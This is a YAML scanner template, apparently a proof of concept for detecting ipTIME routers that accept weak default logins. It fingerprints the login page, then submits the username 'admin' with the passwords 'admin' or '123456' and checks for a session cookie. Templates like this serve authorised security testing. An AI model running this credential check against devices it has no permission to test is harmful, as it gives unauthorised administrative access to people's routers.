id: poc-yaml-iptime-weak-password-login
info:
  name: ipTIME 弱口令登录漏洞
  severity: medium
  tags:
  - 弱口令
  finger: iptime
variables:
  password: 'admin

    123456

    '
firstRequest:
  method: GET
  path: /login/login.cgi
  expression: status_code == 200 && ( contains(body,"ipTIME") || contains(body,"/sess-bin/login_session.cgi")
    )
requests:
- method: POST
  path: /sess-bin/login_handler.cgi
  headers:
    Referer: '{{.base_url}}/sess-bin/login_session.cgi'
  data: username=admin&passwd={{.password}}
  expression: status_code == 200 && contains(body,"setCookie") && contains(body,"efm_session_id")
    && contains(body,"login.cgi")
transport: http
